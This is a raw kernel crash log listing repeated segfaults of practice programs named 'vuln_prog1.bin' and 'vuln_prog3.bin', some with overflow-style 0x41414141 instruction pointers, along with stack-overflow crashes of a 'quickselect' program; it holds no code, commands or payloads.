[5142501.027511] vuln_prog3.bin[3081]: segfault at 41414141 ip 0000000041414141 sp 00000000ffffda64 error 14
[5142623.764026] vuln_prog3.bin[3260]: segfault at f7e46da0 ip 00000000f7e46da0 sp 00000000fff96080 error 14
[5142637.541030] vuln_prog3.bin[3272]: segfault at 41414141 ip 0000000041414141 sp 00000000ffffda64 error 14
[5142653.404202] vuln_prog3.bin[3278]: segfault at 41414141 ip 0000000041414141 sp 00000000ffffda84 error 14
[5142667.374554] vuln_prog3.bin[3283]: segfault at 41414141 ip 0000000041414141 sp 00000000ffffda64 error 14
[5142693.226806] vuln_prog3.bin[3315]: segfault at 41414141 ip 0000000041414141 sp 00000000ffffda84 error 14
[5142705.016046] vuln_prog3.bin[3323]: segfault at 41414141 ip 0000000041414141 sp 00000000ffffda64 error 14
[5184265.759325] vuln_prog3.bin[15004]: segfault at 41414141 ip 0000000041414141 sp 00000000ffffda64 error 14
[5184423.106944] vuln_prog3.bin[15092]: segfault at 6e69622b ip 000000000804850e sp 000000006e69622b error 4 in vuln_prog3.bin[8048000+1000]
[5185003.257742] vuln_prog3.bin[15256]: segfault at 6e69622b ip 000000000804850e sp 000000006e69622b error 4 in vuln_prog3.bin[8048000+1000]
[5185275.756916] vuln_prog3.bin[15341]: segfault at 6e69622b ip 000000000804850e sp 000000006e69622b error 4 in vuln_prog3.bin[8048000+1000]
[5193395.901111] vuln_prog1.bin[17992]: segfault at ffffffffffe8a841 ip 00007f2436822bc6 sp 00007fff3b5ad9e0 error 7 in libc-2.23.so[7f24367d6000+1c0000]
[5193732.778290] traps: vuln_prog1.bin[18104] general protection ip:7f9d9cb40bc6 sp:7ffe96152ac0 error:0 in libc-2.23.so[7f9d9caf4000+1c0000]
[5204183.813233] vuln_prog1.bin[21985]: segfault at 7fffffffe8a8 ip 00007f64a5e37bc6 sp 00007ffd3f66f610 error 6 in libc-2.23.so[7f64a5deb000+1c0000]
[5204257.967635] vuln_prog3.bin[22010]: segfault at f7e46da0 ip 00000000f7e46da0 sp 00000000fffa82b0 error 14
[5206238.169154] vuln_prog1.bin[22876]: segfault at 2 ip 0000000000000002 sp 00007fffffffe910 error 14 in vuln_prog1.bin[400000+1000]
[5206275.022911] vuln_prog3.bin[22887]: segfault at 41414141 ip 0000000041414141 sp 00000000ff99add0 error 14
[5206302.589838] vuln_prog3.bin[22918]: segfault at 41414141 ip 0000000041414141 sp 00000000ffa32540 error 14
[5206311.257386] vuln_prog1.bin[22921]: segfault at 2 ip 0000000000000002 sp 00007fffffffe910 error 14 in vuln_prog1.bin[400000+1000]
[5206335.755603] vuln_prog3.bin[22927]: segfault at 41414141 ip 0000000041414141 sp 00000000ff8a8320 error 14
[5206565.399322] vuln_prog1.bin[23563]: segfault at a ip 00007ffff7a59bc6 sp 00007fffffffcfd0 error 6 in libc-2.23.so[7ffff7a0d000+1c0000]
[5207628.317989] vuln_prog1.bin[25001]: segfault at a ip 00007ffff7a59bc6 sp 00007fffffffcfd0 error 6 in libc-2.23.so[7ffff7a0d000+1c0000]
[5212878.580751] quickselect[31454]: segfault at 1088000 ip 000000000040195d sp 00007fff7a2bc158 error 4 in quickselect[400000+3000]
[5212879.016908] quickselect[31474]: segfault at 2270000 ip 000000000040195d sp 00007ffca5da3d88 error 4 in quickselect[400000+3000]
[5215093.160082] quickselect[2361]: segfault at 7ffcd0711ff8 ip 0000000000401be4 sp 00007ffcd0712000 error 6 in quickselect[400000+3000]
[5215093.376819] quickselect[2381]: segfault at 7fff0ad33ff8 ip 0000000000401be4 sp 00007fff0ad34000 error 6 in quickselect[400000+3000]
[5215093.568391] quickselect[2401]: segfault at 7fff01f57ff8 ip 0000000000401be4 sp 00007fff01f58000 error 6 in quickselect[400000+3000]
[5215094.019676] quickselect[2516]: segfault at 7ffd63016ff8 ip 0000000000401be4 sp 00007ffd63017000 error 6 in quickselect[400000+3000]
[5215094.257644] quickselect[2555]: segfault at 7ffc38ed3ff8 ip 0000000000401b6a sp 00007ffc38ed4000 error 6 in quickselect[400000+3000]
[5215094.723688] quickselect[2576]: segfault at 7fff53315ff8 ip 0000000000401be4 sp 00007fff53316000 error 6 in quickselect[400000+3000]
[5215095.188187] quickselect[2597]: segfault at 7fff4de3bff8 ip 0000000000401be4 sp 00007fff4de3c000 error 6 in quickselect[400000+3000]
[5215190.830116] quickselect[3370]: segfault at 7ffe59a0cff8 ip 0000000000401b66 sp 00007ffe59a0d000 error 6 in quickselect[400000+3000]
[5215191.012198] quickselect[3390]: segfault at 7fff7f685ff8 ip 0000000000401b70 sp 00007fff7f686000 error 6 in quickselect[400000+3000]
[5215191.187897] quickselect[3410]: segfault at 7fffab70bff8 ip 0000000000401b70 sp 00007fffab70c000 error 6 in quickselect[400000+3000]
[5215191.613605] quickselect[3525]: segfault at 7ffd19f6fff8 ip 0000000000401e47 sp 00007ffd19f70000 error 6 in quickselect[400000+3000]
[5215191.807905] quickselect[3545]: segfault at 7ffe2f4b7ff8 ip 0000000000401b70 sp 00007ffe2f4b8000 error 6 in quickselect[400000+3000]
[5215192.000928] quickselect[3565]: segfault at 7ffc7b5bcff8 ip 0000000000401b62 sp 00007ffc7b5bd000 error 6 in quickselect[400000+3000]
[5215572.497014] quickselect[3990]: segfault at 7ffd0e50bff8 ip 0000000000401b6a sp 00007ffd0e50c000 error 6 in quickselect[400000+3000]
[5215572.812438] quickselect[4067]: segfault at 7ffe23a82ff8 ip 0000000000401be4 sp 00007ffe23a83000 error 6 in quickselect[400000+3000]
[5215572.975596] quickselect[4086]: segfault at 7fff7dda5ff8 ip 0000000000401b6a sp 00007fff7dda6000 error 6 in quickselect[400000+3000]
[5215573.140594] quickselect[4107]: segfault at 7ffe86b11ff8 ip 0000000000401b6a sp 00007ffe86b12000 error 6 in quickselect[400000+3000]
[5215573.349687] quickselect[4136]: segfault at 7ffc8a225ff8 ip 0000000000401be4 sp 00007ffc8a226000 error 6 in quickselect[400000+3000]
[5215573.539837] quickselect[4157]: segfault at 7ffc20110ff8 ip 0000000000401be4 sp 00007ffc20111000 error 6 in quickselect[400000+3000]
[5215574.042448] quickselect[4178]: segfault at 7ffe072c9ff8 ip 0000000000401b6a sp 00007ffe072ca000 error 6 in quickselect[400000+3000]
[5215574.583384] quickselect[4199]: segfault at 7ffcc36e5ff8 ip 0000000000401b6a sp 00007ffcc36e6000 error 6 in quickselect[400000+3000]
[5215629.264617] quickselect[4535]: segfault at 7ffdb4efbff8 ip 0000000000401b6a sp 00007ffdb4efc000 error 6 in quickselect[400000+3000]
[5215629.496174] quickselect[4555]: segfault at 7ffecfad3ff8 ip 0000000000401be4 sp 00007ffecfad4000 error 6 in quickselect[400000+3000]
[5215629.813339] quickselect[4613]: segfault at 7ffeeff2cff8 ip 0000000000401b6a sp 00007ffeeff2d000 error 6 in quickselect[400000+3000]
[5215630.007606] quickselect[4633]: segfault at 7ffe11885ff8 ip 0000000000401be4 sp 00007ffe11886000 error 6 in quickselect[400000+3000]
[5215630.507014] quickselect[4653]: segfault at 7ffdd6174ff8 ip 0000000000401be4 sp 00007ffdd6175000 error 6 in quickselect[400000+3000]
[5215630.700818] quickselect[4673]: segfault at 7ffe58c5eff8 ip 0000000000401b6a sp 00007ffe58c5f000 error 6 in quickselect[400000+3000]
[5215631.185514] quickselect[4694]: segfault at 7fff25f8dff8 ip 0000000000401be4 sp 00007fff25f8e000 error 6 in quickselect[400000+3000]
[5215631.704195] quickselect[4715]: segfault at 7fff3104cff8 ip 0000000000401be4 sp 00007fff3104d000 error 6 in quickselect[400000+3000]
[5215806.818752] quickselect[5022]: segfault at 937000 ip 0000000000401b6f sp 00007ffeed213180 error 4 in quickselect[400000+3000]
[5215807.087126] quickselect[5062]: segfault at 258c000 ip 0000000000401b6f sp 00007ffd63a7dd20 error 4 in quickselect[400000+3000]
[5215807.279558] quickselect[5082]: segfault at 159b000 ip 0000000000401b6f sp 00007ffecddfaad0 error 4 in quickselect[400000+3000]
[5215807.587123] quickselect[5140]: segfault at 125e000 ip 0000000000401b6f sp 00007ffdb7e9a010 error 4 in quickselect[400000+3000]
[5215807.787020] quickselect[5162]: segfault at 2161000 ip 0000000000401b6f sp 00007fff3e8716e0 error 4 in quickselect[400000+3000]
[5215807.979834] quickselect[5184]: segfault at 1497000 ip 0000000000401b6f sp 00007ffd5ed04210 error 4 in quickselect[400000+3000]
[5215808.540947] quickselect[5245]: segfault at 7f98c8177000 ip 0000000000401b6f sp 00007fffdb25fa90 error 4 in quickselect[400000+3000]
[5215809.011256] quickselect[5266]: segfault at 7f345f343000 ip 0000000000401b6f sp 00007ffc369cb700 error 4 in quickselect[400000+3000]
[5215882.705910] vuln_prog3.bin[5301]: segfault at f7e46da0 ip 00000000f7e46da0 sp 00000000ffc05e80 error 14
[5215942.189608] quickselect[5586]: segfault at 25d8000 ip 0000000000401b94 sp 00007ffdf2540aa0 error 4 in quickselect[400000+3000]
[5215942.406507] quickselect[5606]: segfault at aba000 ip 0000000000401b84 sp 00007ffda15ecd00 error 4 in quickselect[400000+3000]
[5215942.616521] quickselect[5626]: segfault at 1129000 ip 0000000000401b84 sp 00007ffefd1c2690 error 4 in quickselect[400000+3000]
[5215942.940129] quickselect[5646]: segfault at 1577000 ip 0000000000401b84 sp 00007ffc8d0dee30 error 4 in quickselect[400000+3000]
[5215943.351522] quickselect[5704]: segfault at 1d38000 ip 0000000000401b94 sp 00007ffd21d6b170 error 4 in quickselect[400000+3000]
[5215943.557534] quickselect[5724]: segfault at 242c000 ip 0000000000401b94 sp 00007ffd05b0f820 error 4 in quickselect[400000+3000]
[5215943.770277] quickselect[5744]: segfault at 77e000 ip 0000000000401b94 sp 00007ffd29b9a370 error 4 in quickselect[400000+3000]
[5215943.983865] quickselect[5764]: segfault at 1b8e000 ip 0000000000401b84 sp 00007ffe9049fa20 error 4 in quickselect[400000+3000]
[5215944.188413] quickselect[5784]: segfault at 1486000 ip 0000000000401b84 sp 00007fffa0d71860 error 4 in quickselect[400000+3000]
[5216172.527329] show_signal_msg: 2 callbacks suppressed
[5216172.527336] quickselect[7159]: segfault at 7fff1b1feff8 ip 0000000000401b70 sp 00007fff1b1ff000 error 6 in quickselect[400000+3000]
[5216172.747815] quickselect[7180]: segfault at 7ffd3c262ff8 ip 0000000000401b70 sp 00007ffd3c263000 error 6 in quickselect[400000+3000]
[5216172.961584] quickselect[7200]: segfault at 7ffd6b4e5ff8 ip 0000000000401b70 sp 00007ffd6b4e6000 error 6 in quickselect[400000+3000]
[5216173.160804] quickselect[7220]: segfault at 7ffe62bb6ff8 ip 0000000000401b66 sp 00007ffe62bb7000 error 6 in quickselect[400000+3000]
[5216173.349291] quickselect[7240]: segfault at 7ffddde6bff8 ip 0000000000401b66 sp 00007ffddde6c000 error 6 in quickselect[400000+3000]
[5216173.621680] quickselect[7279]: segfault at 7fff5acb2ff8 ip 0000000000401b62 sp 00007fff5acb3000 error 6 in quickselect[400000+3000]
[5216173.844732] quickselect[7299]: segfault at 7ffc3ec3dff8 ip 0000000000401b70 sp 00007ffc3ec3e000 error 6 in quickselect[400000+3000]
[5216174.056972] quickselect[7319]: segfault at 7ffdcdeccff8 ip 0000000000401b70 sp 00007ffdcdecd000 error 6 in quickselect[400000+3000]
[5216174.268916] quickselect[7339]: segfault at 7fff1232eff8 ip 0000000000401b66 sp 00007fff1232f000 error 6 in quickselect[400000+3000]
[5216174.473223] quickselect[7359]: segfault at 7fffd630fff8 ip 0000000000401b62 sp 00007fffd6310000 error 6 in quickselect[400000+3000]
[5216227.792668] show_signal_msg: 2 callbacks suppressed
[5216227.792675] quickselect[7677]: segfault at 7ffcc4757ff8 ip 0000000000401b66 sp 00007ffcc4758000 error 6 in quickselect[400000+3000]
[5216227.998667] quickselect[7697]: segfault at 7ffe5a22eff8 ip 0000000000401b70 sp 00007ffe5a22f000 error 6 in quickselect[400000+3000]
[5216228.187809] quickselect[7717]: segfault at 7fffbb310ff8 ip 0000000000401b70 sp 00007fffbb311000 error 6 in quickselect[400000+3000]
[5216228.397321] quickselect[7737]: segfault at 7ffd68df0ff8 ip 0000000000401b66 sp 00007ffd68df1000 error 6 in quickselect[400000+3000]
[5216228.577452] quickselect[7757]: segfault at 7ffcda7f7ff8 ip 0000000000401b62 sp 00007ffcda7f8000 error 6 in quickselect[400000+3000]
[5216228.810274] quickselect[7796]: segfault at 7ffc869c2ff8 ip 0000000000401d20 sp 00007ffc869c3000 error 6 in quickselect[400000+3000]
[5216228.978673] quickselect[7816]: segfault at 7ffe6dbcbff8 ip 0000000000401d20 sp 00007ffe6dbcc000 error 6 in quickselect[400000+3000]
[5216229.160678] quickselect[7836]: segfault at 7ffee59bbff8 ip 0000000000401b62 sp 00007ffee59bc000 error 6 in quickselect[400000+3000]
[5216229.339133] quickselect[7856]: segfault at 7ffcd1505ff8 ip 0000000000401b66 sp 00007ffcd1506000 error 6 in quickselect[400000+3000]
[5216229.519624] quickselect[7876]: segfault at 7fff5484cff8 ip 0000000000401b62 sp 00007fff5484d000 error 6 in quickselect[400000+3000]
[5216255.608088] show_signal_msg: 2 callbacks suppressed
[5216255.608096] quickselect[8190]: segfault at 7ffd05dffff8 ip 0000000000401b6a sp 00007ffd05e00000 error 6 in quickselect[400000+3000]
[5216255.818424] quickselect[8210]: segfault at 7fff92dfeff8 ip 0000000000401b6a sp 00007fff92dff000 error 6 in quickselect[400000+3000]
[5216255.985669] quickselect[8230]: segfault at 7ffc25075ff8 ip 0000000000401b6a sp 00007ffc25076000 error 6 in quickselect[400000+3000]
[5216256.153212] quickselect[8250]: segfault at 7ffda69eeff8 ip 0000000000401b6a sp 00007ffda69ef000 error 6 in quickselect[400000+3000]
[5216256.327303] quickselect[8270]: segfault at 7ffd87877ff8 ip 0000000000401b6a sp 00007ffd87878000 error 6 in quickselect[400000+3000]
[5216256.539565] quickselect[8309]: segfault at 7fff77c69ff8 ip 0000000000401b6a sp 00007fff77c6a000 error 6 in quickselect[400000+3000]
[5216256.723010] quickselect[8329]: segfault at 7ffffd19cff8 ip 0000000000401bcc sp 00007ffffd19d000 error 6 in quickselect[400000+3000]
[5216256.887844] quickselect[8349]: segfault at 7ffcd24ebff8 ip 0000000000401bcc sp 00007ffcd24ec000 error 6 in quickselect[400000+3000]
[5216257.046181] quickselect[8369]: segfault at 7ffc5bc8cff8 ip 0000000000401bcc sp 00007ffc5bc8d000 error 6 in quickselect[400000+3000]
[5216257.219775] quickselect[8389]: segfault at 7ffc26574ff8 ip 0000000000401b6a sp 00007ffc26575000 error 6 in quickselect[400000+3000]
[5269233.903545] show_signal_msg: 2 callbacks suppressed
[5269233.903579] vuln_prog1.bin[24247]: segfault at a ip 00007ffff7a59bc6 sp 00007fffffffd040 error 6 in libc-2.23.so[7ffff7a0d000+1c0000]
[5269476.891777] vuln_prog1.bin[24300]: segfault at a ip 00007ffff7a59bc6 sp 00007fffffffd040 error 6 in libc-2.23.so[7ffff7a0d000+1c0000]
[5269649.784250] vuln_prog1.bin[24343]: segfault at 10797 ip 0000000000010797 sp 00007fffffffe910 error 14 in vuln_prog1.bin[400000+1000]
[5270002.566739] vuln_prog1.bin[24437]: segfault at 10797 ip 0000000000010797 sp 00007fffffffe910 error 14 in vuln_prog1.bin[400000+1000]
[5270083.455956] vuln_prog1.bin[24455]: segfault at 10797 ip 0000000000010797 sp 00007fffffffe910 error 14 in vuln_prog1.bin[400000+1000]
[5271795.265996] vuln_prog1.bin[24933]: segfault at a ip 00007ffff7a59bc6 sp 00007fffffffd040 error 6 in libc-2.23.so[7ffff7a0d000+1c0000]
[5272087.622488] vuln_prog1.bin[25122]: segfault at 7fa8a46352c0 ip 00007fa8a458d533 sp 00007ffdbc60c380 error 7 in libc-2.23.so[7fa8a453e000+1c0000]
[5275704.677963] vuln_prog3.bin[26443]: segfault at f7e46da0 ip 00000000f7e46da0 sp 00000000ff9c0b60 error 14
[5286317.990996] traps: vuln_prog1.bin[29639] general protection ip:7f33dd73abc6 sp:7fff14b93220 error:0 in libc-2.23.so[7f33dd6ee000+1c0000]
[5296237.688572] traps: vuln_prog1.bin[947] general protection ip:7f63a2c2bbc6 sp:7ffe22917e40 error:0 in libc-2.23.so[7f63a2bdf000+1c0000]
[5296396.451928] vuln_prog3.bin[997]: segfault at f7e46da0 ip 00000000f7e46da0 sp 00000000ffceac20 error 14
[5296659.180931] vuln_prog3.bin[1050]: segfault at f7e46da0 ip 00000000f7e46da0 sp 00000000ff93d520 error 14
[5298342.643387] quickselect[1964]: segfault at 2428000 ip 00000000004019c0 sp 00007ffc32beffd0 error 4 in quickselect[400000+2000]
[5298342.801472] quickselect[1984]: segfault at 793000 ip 00000000004019c0 sp 00007ffcfd6049c0 error 4 in quickselect[400000+2000]
[5298448.025330] quickselect[2402]: segfault at 18d6000 ip 00000000004019c0 sp 00007ffe4d32acf0 error 4 in quickselect[400000+3000]
[5298448.180325] quickselect[2422]: segfault at 1c42000 ip 00000000004019c0 sp 00007fff0294e420 error 4 in quickselect[400000+3000]
[5298646.519021] quickselect[2857]: segfault at e2d000 ip 00000000004019c0 sp 00007fffc1afb8c0 error 4 in quickselect[400000+2000]
[5298646.677653] quickselect[2877]: segfault at 194c000 ip 00000000004019c0 sp 00007ffe0c1053e0 error 4 in quickselect[400000+2000]
[5299204.867968] quickselect[5869]: segfault at 92e000 ip 00000000004019e1 sp 00007ffeba817820 error 4 in quickselect[400000+3000]
[5299205.121081] quickselect[5889]: segfault at b9d000 ip 00000000004019e1 sp 00007ffccf186ea0 error 4 in quickselect[400000+3000]
[5306967.669943] traps: vuln_prog1.bin[11038] general protection ip:7fc6d9cf4bc6 sp:7ffff5bf0a40 error:0 in libc-2.23.so[7fc6d9ca8000+1c0000]
[5307553.732522] vuln_prog3.bin[11210]: segfault at f7e46da0 ip 00000000f7e46da0 sp 00000000ff9e69e0 error 14
[5307713.647504] vuln_prog3.bin[11235]: segfault at f7e46da0 ip 00000000f7e46da0 sp 00000000ffa4be80 error 14
[5307738.186325] vuln_prog3.bin[11240]: segfault at f7e46da0 ip 00000000f7e46da0 sp 00000000ffdeb580 error 14
[5310783.801270] quickselect[14021]: segfault at 7ffffb3c9ff8 ip 0000000000401f9c sp 00007ffffb3c9ff0 error 6 in quickselect[400000+4000]
[5310784.588128] quickselect[14118]: segfault at 7ffc50febff8 ip 0000000000401f9c sp 00007ffc50febff0 error 6 in quickselect[400000+4000]
[5310787.744145] quickselect[14190]: segfault at 7ffe9c3fcff8 ip 0000000000401f9c sp 00007ffe9c3fcff0 error 6 in quickselect[400000+4000]
[5310853.538959] quickselect[14531]: segfault at 7ffdec4bdff8 ip 0000000000401fba sp 00007ffdec4be000 error 6 in quickselect[400000+4000]
[5310853.964914] quickselect[14627]: segfault at 7ffe764d0ff8 ip 0000000000401fba sp 00007ffe764d1000 error 6 in quickselect[400000+4000]
[5310856.984277] quickselect[14700]: segfault at 7ffea49f4fe8 ip 0000000000401f9c sp 00007ffea49f4fe0 error 6 in quickselect[400000+4000]
[5311251.750447] quickselect[15089]: segfault at 7ffe7aa6efe8 ip 0000000000401f9c sp 00007ffe7aa6efe0 error 6 in quickselect[400000+4000]
[5311252.163974] quickselect[15185]: segfault at 7ffecb06efe8 ip 0000000000401f9c sp 00007ffecb06efe0 error 6 in quickselect[400000+4000]
[5311255.587909] quickselect[15257]: segfault at 7ffe9015eff8 ip 0000000000401f9c sp 00007ffe9015eff0 error 6 in quickselect[400000+4000]
[5313501.502240] vuln_prog3.bin[20305]: segfault at f7e46da0 ip 00000000f7e46da0 sp 00000000ffde4250 error 14
[5313723.252092] vuln_prog3.bin[20492]: segfault at f7e46da0 ip 00000000f7e46da0 sp 00000000ffce7c80 error 14
[5314858.834279] traps: vuln_prog1.bin[20704] general protection ip:7fac55067f49 sp:7ffc94176120 error:0 in libc-2.23.so[7fac5501b000+1c0000]
[5317520.734251] vuln_prog1.bin[21562]: segfault at 7fb46402e2c0 ip 00007fb463f86533 sp 00007ffdccccc030 error 7 in libc-2.23.so[7fb463f37000+1c0000]
[5317563.969773] vuln_prog1.bin[21571]: segfault at 7f492fef32c0 ip 00007f492fe4b533 sp 00007ffcf245e810 error 7 in libc-2.23.so[7f492fdfc000+1c0000]
[5342465.441863] quickselect[31587]: segfault at 7ffccd88bff8 ip 0000000000401be4 sp 00007ffccd88c000 error 6 in quickselect[400000+3000]
[5342465.965902] quickselect[31626]: segfault at 7ffceaed6ff8 ip 0000000000401be4 sp 00007ffceaed7000 error 6 in quickselect[400000+3000]
[5342466.618933] quickselect[31722]: segfault at 7ffe8da3aff8 ip 0000000000401b6a sp 00007ffe8da3b000 error 6 in quickselect[400000+3000]
[5342466.957207] quickselect[31780]: segfault at 7ffdcfa74ff8 ip 0000000000401b6a sp 00007ffdcfa75000 error 6 in quickselect[400000+3000]
[5342467.471085] quickselect[31801]: segfault at 7fff5d9c6ff8 ip 0000000000401b6a sp 00007fff5d9c7000 error 6 in quickselect[400000+3000]
[5342467.962144] quickselect[31822]: segfault at 7ffcb5809ff8 ip 0000000000401b6a sp 00007ffcb580a000 error 6 in quickselect[400000+3000]
[5343579.034913] quickselect[1937]: segfault at 775000 ip 000000000040180f sp 00007ffeffb9a0d0 error 4 in quickselect[400000+4000]
[5343579.210794] quickselect[1957]: segfault at 1090000 ip 000000000040180f sp 00007ffeb82dcdd0 error 4 in quickselect[400000+4000]
[5343579.371390] quickselect[1977]: segfault at dd2000 ip 000000000040180f sp 00007ffd8c4ba0c0 error 4 in quickselect[400000+4000]
[5343579.562279] quickselect[1997]: segfault at 2160000 ip 000000000040180f sp 00007ffc5f41bf60 error 4 in quickselect[400000+4000]
[5343579.753799] quickselect[2017]: segfault at 748000 ip 000000000040180f sp 00007ffed2657c70 error 4 in quickselect[400000+4000]
[5343579.929315] quickselect[2037]: segfault at 12ef000 ip 000000000040180f sp 00007ffecdd05200 error 4 in quickselect[400000+4000]
[5343580.089635] quickselect[2057]: segfault at a57000 ip 000000000040180f sp 00007ffcaa8fb800 error 4 in quickselect[400000+4000]
[5343580.248635] quickselect[2077]: segfault at c90000 ip 000000000040180f sp 00007ffce570dcb0 error 4 in quickselect[400000+4000]
[5343580.417867] quickselect[2097]: segfault at 1a3f000 ip 000000000040180f sp 00007fff4d113ae0 error 4 in quickselect[400000+4000]
[5343580.619274] quickselect[2117]: segfault at 1ace000 ip 000000000040180f sp 00007ffe283e1f00 error 4 in quickselect[400000+4000]
[5344306.592853] show_signal_msg: 3 callbacks suppressed
[5344306.592858] quickselect[4707]: segfault at 7fff013e6ff8 ip 00000000004020a1 sp 00007fff013e7000 error 6 in quickselect[400000+4000]
[5344306.838922] quickselect[4746]: segfault at 7ffc4ef75ff8 ip 00000000004020a1 sp 00007ffc4ef76000 error 6 in quickselect[400000+4000]
[5344307.004559] quickselect[4766]: segfault at 7fff027fbfe8 ip 00000000004020b3 sp 00007fff027fbfe0 error 6 in quickselect[400000+4000]
[5344307.314048] quickselect[4843]: segfault at 7ffd861f4fe8 ip 00000000004020b3 sp 00007ffd861f4fe0 error 6 in quickselect[400000+4000]
[5344307.485866] quickselect[4863]: segfault at 7ffe05b27ff8 ip 00000000004020b3 sp 00007ffe05b27ff0 error 6 in quickselect[400000+4000]
[5344307.673787] quickselect[4883]: segfault at 7ffe8bd17ff8 ip 00000000004020a1 sp 00007ffe8bd18000 error 6 in quickselect[400000+4000]
[5344307.837119] quickselect[4903]: segfault at 7ffc96fb0fe8 ip 00000000004020b3 sp 00007ffc96fb0fe0 error 6 in quickselect[400000+4000]
[5344432.113455] quickselect[5220]: segfault at 7ffedb667ff8 ip 00000000004020ab sp 00007ffedb668000 error 6 in quickselect[400000+4000]
[5344432.349389] quickselect[5259]: segfault at 7ffd78f9bff8 ip 00000000004020ab sp 00007ffd78f9c000 error 6 in quickselect[400000+4000]
[5344432.758607] quickselect[5279]: segfault at 7ffd98583ff8 ip 00000000004020bd sp 00007ffd98583ff0 error 6 in quickselect[400000+4000]
[5344433.120480] quickselect[5356]: segfault at 7ffe1a22eff8 ip 00000000004020db sp 00007ffe1a22f000 error 6 in quickselect[400000+4000]
[5344433.288129] quickselect[5376]: segfault at 7ffd06ef1ff8 ip 00000000004020ab sp 00007ffd06ef2000 error 6 in quickselect[400000+4000]
[5344433.468990] quickselect[5396]: segfault at 7fff9f584fe8 ip 00000000004020bd sp 00007fff9f584fe0 error 6 in quickselect[400000+4000]
[5344433.683188] quickselect[5416]: segfault at 7ffd56f6bff8 ip 00000000004020bd sp 00007ffd56f6bff0 error 6 in quickselect[400000+4000]
[5344498.916623] quickselect[5725]: segfault at 7ffdd0e33ff8 ip 00000000004020d9 sp 00007ffdd0e34000 error 6 in quickselect[400000+4000]
[5344499.178580] quickselect[5764]: segfault at 7ffd4c2daff8 ip 00000000004020eb sp 00007ffd4c2daff0 error 6 in quickselect[400000+4000]
[5344499.380347] quickselect[5784]: segfault at 7ffcce6feff8 ip 00000000004020d9 sp 00007ffcce6ff000 error 6 in quickselect[400000+4000]
[5344499.753349] quickselect[5863]: segfault at 7ffe361bbfe8 ip 00000000004020eb sp 00007ffe361bbfe0 error 6 in quickselect[400000+4000]
[5344499.969276] quickselect[5883]: segfault at 7fffe6814ff8 ip 00000000004020d9 sp 00007fffe6815000 error 6 in quickselect[400000+4000]
[5344500.179867] quickselect[5904]: segfault at 7ffc348bbfe8 ip 00000000004020eb sp 00007ffc348bbfe0 error 6 in quickselect[400000+4000]
[5344500.378393] quickselect[5924]: segfault at 7ffdef99dfe8 ip 00000000004020eb sp 00007ffdef99dfe0 error 6 in quickselect[400000+4000]
[5344653.023148] quickselect[6352]: segfault at 7ffd7f9e6ff8 ip 00000000004020ef sp 00007ffd7f9e6ff0 error 6 in quickselect[400000+4000]
[5344653.206101] quickselect[6372]: segfault at 7ffc50a10ff8 ip 000000000040210d sp 00007ffc50a11000 error 6 in quickselect[400000+4000]
[5344653.383413] quickselect[6392]: segfault at 7ffe42cf9ff8 ip 00000000004020dd sp 00007ffe42cfa000 error 6 in quickselect[400000+4000]
[5344653.601133] quickselect[6412]: segfault at 7ffd878a1ff8 ip 00000000004020dd sp 00007ffd878a2000 error 6 in quickselect[400000+4000]
[5344653.824637] quickselect[6432]: segfault at 7ffdecd53ff8 ip 00000000004020ef sp 00007ffdecd53ff0 error 6 in quickselect[400000+4000]
[5344654.104910] quickselect[6471]: segfault at 7ffdf561aff8 ip 00000000004020ef sp 00007ffdf561aff0 error 6 in quickselect[400000+4000]
[5344654.331650] quickselect[6492]: segfault at 7ffd59183ff8 ip 00000000004020ef sp 00007ffd59183ff0 error 6 in quickselect[400000+4000]
[5344654.518835] quickselect[6512]: segfault at 7fff742c4ff8 ip 000000000040210d sp 00007fff742c5000 error 6 in quickselect[400000+4000]
[5344654.690700] quickselect[6532]: segfault at 7ffcdb6a4ff8 ip 000000000040210d sp 00007ffcdb6a5000 error 6 in quickselect[400000+4000]
[5344704.098768] quickselect[6818]: segfault at 7ffc254d5ff8 ip 00000000004020ff sp 00007ffc254d6000 error 6 in quickselect[400000+4000]
[5344704.631856] quickselect[6838]: segfault at 7ffd5847eff8 ip 00000000004020e1 sp 00007ffd5847eff0 error 6 in quickselect[400000+4000]
[5344704.921981] quickselect[6896]: segfault at 7ffe16d29ff8 ip 00000000004020e1 sp 00007ffe16d29ff0 error 6 in quickselect[400000+4000]
[5344705.088633] quickselect[6916]: segfault at 7ffc885e9ff8 ip 00000000004020cf sp 00007ffc885ea000 error 6 in quickselect[400000+4000]
[5344705.293120] quickselect[6957]: segfault at 7ffc7015aff8 ip 00000000004020cf sp 00007ffc7015b000 error 6 in quickselect[400000+4000]
[5344705.463002] quickselect[6979]: segfault at 7ffd2f684fe8 ip 00000000004020e1 sp 00007ffd2f684fe0 error 6 in quickselect[400000+4000]
[5344705.643588] quickselect[7000]: segfault at 7fffa4148ff8 ip 00000000004020cf sp 00007fffa4149000 error 6 in quickselect[400000+4000]
[5344705.808492] quickselect[7020]: segfault at 7fff0ff5efe8 ip 00000000004020e1 sp 00007fff0ff5efe0 error 6 in quickselect[400000+4000]
[5344706.001733] quickselect[7040]: segfault at 7ffda9dc7fe8 ip 00000000004020e1 sp 00007ffda9dc7fe0 error 6 in quickselect[400000+4000]
[5344706.178283] quickselect[7062]: segfault at 7ffdce1a0fe8 ip 00000000004020e1 sp 00007ffdce1a0fe0 error 6 in quickselect[400000+4000]
[5344757.617696] quickselect[7332]: segfault at 7ffe7c300fe8 ip 00000000004020e1 sp 00007ffe7c300fe0 error 6 in quickselect[400000+4000]
[5344757.820072] quickselect[7352]: segfault at 7ffc3875eff8 ip 00000000004020cf sp 00007ffc3875f000 error 6 in quickselect[400000+4000]
[5344758.114688] quickselect[7410]: segfault at 7fff9e60ffe8 ip 00000000004020e1 sp 00007fff9e60ffe0 error 6 in quickselect[400000+4000]
[5344758.568894] quickselect[7430]: segfault at 7ffe8f14dff8 ip 00000000004020e1 sp 00007ffe8f14dff0 error 6 in quickselect[400000+4000]
[5344758.815825] quickselect[7469]: segfault at 7fffddc9eff8 ip 00000000004020e1 sp 00007fffddc9eff0 error 6 in quickselect[400000+4000]
[5344759.003457] quickselect[7489]: segfault at 7ffd6f1ccff8 ip 00000000004020e1 sp 00007ffd6f1ccff0 error 6 in quickselect[400000+4000]
[5344759.169114] quickselect[7510]: segfault at 7ffd5723aff8 ip 00000000004020e1 sp 00007ffd5723aff0 error 6 in quickselect[400000+4000]
[5344759.342438] quickselect[7530]: segfault at 7ffc619b2ff8 ip 00000000004020ff sp 00007ffc619b3000 error 6 in quickselect[400000+4000]
[5344759.525217] quickselect[7550]: segfault at 7ffc93119ff8 ip 00000000004020e1 sp 00007ffc93119ff0 error 6 in quickselect[400000+4000]
